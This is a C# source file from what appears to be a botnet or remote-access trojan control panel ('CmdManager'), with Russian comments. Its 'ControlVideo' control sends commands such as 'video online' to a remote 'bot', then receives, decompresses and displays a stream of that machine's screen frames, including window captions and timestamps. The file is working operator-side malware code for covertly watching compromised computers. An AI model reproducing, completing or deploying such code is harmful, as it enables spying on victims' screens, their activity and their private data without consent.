using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Net.Sockets;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

namespace CmdManager
{
	public partial class ControlVideo : UserControl, IControlPage
	{
		public delegate void DelegateSetBitmap(Bitmap bmp);

		Server.IdUid bot;
		VideoStream vs = null;
		Thread thVideo = null;
		DelegateSetBitmap funcSetBitmap;

		public ControlVideo(Server.IdUid bot)
		{
			InitializeComponent();
			this.bot = bot;
			funcSetBitmap = new DelegateSetBitmap(SetBitmap);
		}

		public void Start()
		{
			vs = new VideoStream(this);
			thVideo = new Thread(vs.Execute);
			thVideo.Start();
		}

		public void Stop()
		{
			if (thVideo != null)
			{
				vs.Stop();
				thVideo.Join();
				thVideo = null;
			}
		}

		void SetBitmap(Bitmap bmp)
		{
			pbVideo.Image = bmp;
		}

		public Server.IdUid Bot
		{
			get { return bot; }
		}

		private void btRefresh_Click(object sender, EventArgs e)
		{
			bot.server.CM_SendCmd(bot.id, bot.uid, "video null");
		}

		private void btStop_Click(object sender, EventArgs e)
		{
			Stop();
		}

		private void btStart_Click(object sender, EventArgs e)
		{
			if (thVideo == null)
				Start();
		}

		class VideoStream
		{
			ControlVideo ctrl;
			bool stop = false;

			public VideoStream(ControlVideo ctrl)
			{
				this.ctrl = ctrl;
			}

			uint GetIdVideoStream()
			{
				Server.StreamInfo video = null;
				for (int p = 0; p < 10; p++)
				{
					Server.StreamInfo[] si = ctrl.Bot.server.CM_GetStreams(ctrl.Bot.id, ctrl.Bot.uid);
					if (si == null)
					{
						Program.AddLog("Для бота " + ctrl.Bot.uid + " сервер не возвращает список потоков, возможно невозможно подключиться к серверу");
						return 0;
					}
					for (int i = 0; i < si.Length; i++)
						if (si[i].type == Server.StreamType.Video)
						{
							video = si[i];
							break;
						}
					if (video == null) //с бота нет видео, даем команду на запуск видео
					{
						if (p == 0)
						{
							ctrl.Bot.server.CM_SendCmd(ctrl.Bot.id, ctrl.Bot.uid, "video online");
							Thread.Sleep(2000);
						}
						else
							Thread.Sleep(1000);
					}
					else
						break;
				}
				return video == null ? 0 : video.id;
			}

			public void Execute()
			{
				uint idvs = GetIdVideoStream();
				if (idvs == 0)
				{
					Program.AddLog("Не удалось запустить видео на боте " + ctrl.Bot.uid);
					return;
				}
				Socket sc = ctrl.Bot.server.CM_GetStream(ctrl.Bot.id, ctrl.Bot.uid, idvs);
				if (sc == null)
				{
					Program.AddLog("Не удалось подключиться к видео потоку бота " + ctrl.Bot.uid);
					return;
				}
				LoopFrames(sc);
				if (sc.Connected) sc.Close();
			}

			void LoopFrames(Socket sc)
			{
				byte[] data = new byte[1024 * 100];
				byte[] data2 = null, dataTmp = null;
				FrameStru frameInfo = new FrameStru();
				Frame prev = null;
				int waitFirstFrame = 0;
				while (!stop)
				{
					int size = Server.ReadDataStream(sc, ref data, 2000);
					if (size == 0) break;
					if (size > 0)
					{
						int sz = BitConverter.ToInt32(data, 0);
						if (sz < size)
						{
							global::Server.LZW lzw = new global::Server.LZW();
							if (dataTmp == null || dataTmp.Length < sz) dataTmp = new byte[sz];
							if (data2 == null || data2.Length < 20 * sz) data2 = new byte[20 * sz];
							Array.Copy(data, 4, dataTmp, 0, sz);
							sz = lzw.from_lzw(dataTmp, data2);
							int i = 0;
							while (i < sz)
							{
								frameInfo = GetFrameStru(data2, i);
								if (prev != null || frameInfo.type == 0)
								{
									Frame frame = new Frame(frameInfo.width, frameInfo.height, frameInfo.type, data2, i + frameInfo.szStruct, frameInfo.szData);
									Frame next;
									Bitmap bmp = frame.GetBitmap(prev, 2, out next);
									ctrl.funcSetBitmap(bmp);
									prev = next;
								}
								else
								{
									waitFirstFrame++;
									//если долго нет начального кадра, то посылаем команду боту, чтобы дал начальный кадр
									if (waitFirstFrame > 10)
									{
										waitFirstFrame = 0;
										ctrl.Bot.server.CM_SendCmd(ctrl.Bot.id, ctrl.Bot.uid, "video null");
									}
								}

								i += frameInfo.szStruct + frameInfo.szData + frameInfo.szCaption;
							}
						}
					}
				}
				ctrl.funcSetBitmap(null);
			}

			/*
						void LoopFrames(Socket sc)
						{
							int state = 0;
							byte[] data = new byte[65536];
							FrameStru frameInfo = new FrameStru();
							Frame prev = null;
							int waitFirstFrame = 0;
							while (!stop)
							{
								int size = Server.ReadDataStream(sc, ref data, 2000);
								if (size == 0) break;
								if (size > 0)
								{
									switch (state)
									{
										case 0: //начало видео, ищем начальный кадр
											if (size == Frame.SizeFrame)
											{
												frameInfo = GetFrameStru(data);
												if (frameInfo.szStruct == Frame.SizeFrame) 
												{
													if (frameInfo.type == 0) //начальный кадр
													{
														state = 1;
													}
													else
													{
														waitFirstFrame++;
														//если долго нет начального кадра, то посылаем команду боту, чтобы дал начальный кадр
														if (waitFirstFrame > 10)
														{
															waitFirstFrame = 0;
															ctrl.Bot.server.CM_SendCmd(ctrl.Bot.id, ctrl.Bot.uid, "video null");
														}
													}
												}
											}
											break;
										case 1: //данные кадра (распаковка картинки)
											Frame frame = new Frame(frameInfo.width, frameInfo.height, frameInfo.type, data, size);
											Frame next;
											Bitmap bmp = frame.GetBitmap(prev, 2, out next);
											ctrl.funcSetBitmap(bmp);
											prev = next;
											if (frameInfo.szCaption > 0)
												state = 2;
											else
												state = 3;
											break;
										case 2: //чтение заголовка текущего окна
											state = 3;
											break;
										case 3: //заголовок следующего кадра
											if (size == Frame.SizeFrame)
											{
												frameInfo = GetFrameStru(data);
												state = 1;
											}
											else
												state = 0;
											break;
									}
								}
							}
							ctrl.funcSetBitmap(null);
						}*/
			FrameStru GetFrameStru(byte[] data, int offset)
			{
				int size = Frame.SizeFrame; // Marshal.SizeOf(typeof(FrameStru));
				byte[] data2 = new byte[size];
				Array.Copy(data, offset, data2, 0, size);
				//переводим байтовый массив в структуру
				GCHandle handle = GCHandle.Alloc(data2, GCHandleType.Pinned);
				FrameStru ret = (FrameStru)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(FrameStru));
				handle.Free();
				return ret;
			}

			public void Stop()
			{
				stop = true;
			}
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		struct FrameStru
		{
			public short szStruct;
			public short width;
			public short height;
			public int szData;
			public short type; //0 - начальный кадр, 1 - изменения
			public short szCaption; //размер заголовка окна, если 0, то он такой же как и предыдущем кадре
			//дата кадра
			public short year;
			public char month;
			public char day;
			public char hour;
			public char minute;
			public char second;
		};

		public class Frame
		{
			int width, height;
			int type;
			int szPack;
			int szData;
			byte[] data;

			public const int SizeFrame = 21; //размер структуры Frame в видео файле

			public Frame(int w, int h, int t, byte[] data, int offset, int sz)
			{
				width = w;
				height = h;
				szData = sz;
				szPack = sz;
				type = t;
				this.data = new byte[sz];
				if (offset >= 0)
					Array.Copy(data, offset, this.data, 0, sz);
				else
					this.data = data;
			}

			public Bitmap GetBitmap(Frame prev, int bitsColor, out Frame unpackFrame)
			{
				Bitmap img = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
				BitmapData bd = img.LockBits(new Rectangle(0, 0, width, height), ImageLockMode.WriteOnly, PixelFormat.Format24bppRgb);
				unpackFrame = UnpackFrame(prev, bitsColor);
				int up = 8 - bitsColor;
				int add = (1 << up) - 1;
				unsafe
				{
					int i = 0;
					for (int h = 0; h < height; h++)
					{
						byte* p = (byte*)bd.Scan0 + h * bd.Stride;
						for (int w = 0; w < width; w++)
						{
							byte v = (byte)((unpackFrame.data[i] << up) | add);
							p[0] = v;
							p[1] = v;
							p[2] = v;
							p += 3;
							i++;
						}
					}
				}
				img.UnlockBits(bd);
				return img;
			}

			byte[] Unpack(byte[] img, int bitsColor, bool add)
			{
				byte[] ret = null;
				switch (bitsColor)
				{
					case 2:
						ret = UnpackBits2(img, add);
						break;
				}
				return ret;
			}

			byte[] UnpackBits2(byte[] img, bool add)
			{
				int i = 0;
				int n = 0;
				try
				{
					while (i < szData)
					{
						int count = 0;
						byte s = 0;
						if ((data[i] & 0x80) != 0)
							if ((data[i] & 0x40) != 0)
							{
								count = ((data[i] & 0x3f) << 14) | (data[i + 1] << 6) | (data[i + 2] >> 2);
								count += 4096 + 32 + 1;
								s = (byte)(data[i + 2] & 0x3);
								i += 3;
							}
							else
							{
								count = ((data[i] & 0x3f) << 6) | (data[i + 1] >> 2);
								count += 32 + 1;
								s = (byte)(data[i + 1] & 0x3);
								i += 2;
							}
						else
						{
							count = ((data[i] >> 2) & 0x1f) + 1;
							s = (byte)(data[i] & 0x3);
							i++;
						}
						if (add)
						{
							if (s != 0)
								for (int j = 0; j < count; j++, n++)
									img[n] += s;
							else
								n += count;
						}
						else
						{
							if (img.Length < n + count) count = img.Length - n;
							for (int j = 0; j < count; j++, n++)
								img[n] = s;
						}
					}
				}
				catch
				{
				}
				return img;
			}

			public Frame UnpackFrame(Frame prev, int bitsColor)
			{
				byte[] unpackData = new byte[height * width];
				switch (type)
				{
					case 0: //текущий кадр начальный
						Unpack(unpackData, bitsColor, false);
						break;
					case 1:
						byte mask = (byte)((1 << bitsColor) - 1);
						Array.Copy(prev.data, unpackData, unpackData.Length);
						//налаживаем текущий кадр
						Unpack(unpackData, bitsColor, true);
						break;
				}
				return new Frame(width, height, 10, unpackData, -1, unpackData.Length);
			}

		}

	}
}
